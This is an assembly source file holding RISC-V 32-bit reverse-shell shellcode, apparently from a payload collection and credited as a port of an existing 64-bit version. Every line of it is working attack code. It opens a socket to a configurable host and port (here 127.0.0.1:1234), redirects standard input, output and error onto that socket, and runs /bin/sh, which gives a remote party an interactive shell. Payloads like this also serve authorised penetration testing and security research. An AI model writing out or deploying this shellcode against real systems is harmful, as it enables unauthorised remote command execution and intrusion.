# RISC-V 32-bit reverse shell shellcode
# Ported to 32-bit from modexp's RISC-V 64-bit reverse shell shellcode:
# https://web.archive.org/web/20230327041655/https://github.com/odzhan/shellcode/commit/d3ee25a6ebcdd21a21d0e6eccc979e45c24a9a1d
# ---
# bcoles

.equ PORT, 1234
.equ HOST, 0x0100007F       # 127.0.0.1

.global _start
.section .text

_start:
    addi    sp, sp, -32     # reserve stack space

    # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    li      a7, 198         # SYS_socket
    li      a2, 0           # IPPROTO_IP
    li      a1, 1           # SOCK_STREAM
    li      a0, 2           # AF_INET
    ecall

    # connect(s, &sa, sizeof(sa));
    mv      a3, a0          # a3 = s
    li      a7, 203         # SYS_connect
    li      a2, 16          # sizeof(struct sockaddr_in)
    li      t0, 2           # AFF_INET
    sh      t0, 0(sp)       # sin_family (AF_INET, 2 bytes)
    li      t0, ((PORT & 0xFF) << 8) | (PORT >> 8)
    sh      t0, 2(sp)       # sin_port (htons(PORT), 2 bytes)
    li      t0, HOST
    sw      t0, 4(sp)       # sin_addr (127.0.0.1, 4 bytes)
    sw      x0, 8(sp)       # sin_zero[0..3] padding
    sw      x0, 12(sp)      # sin_zero[4..7] padding
    mv      a1, sp          # a1 = &sa
    ecall

    # dup3(s, STDERR_FILENO, 0);
    # dup3(s, STDOUT_FILENO, 0);
    # dup3(s, STDIN_FILENO,  0);
    li      a7, 24          # SYS_dup3
    li      a1, 3           # start from STDERR_FILENO + 1 = 3
c_dup:
    mv      a2, x0
    mv      a0, a3
    addi    a1, a1, -1
    ecall
    bne     a1, zero, c_dup

    # execve("/bin/sh", NULL, NULL);
    li      a7, 221         # SYS_execve
    li      t0, 0x6e69622f  # "/bin"
    sw      t0, 0(sp)
    li      t0, 0x0068732f  # "/sh\0"
    sw      t0, 4(sp)
    mv      a0, sp          # path = /bin/sh
    mv      a1, x0          # argv = NULL
    mv      a2, x0          # envp = NULL
    ecall

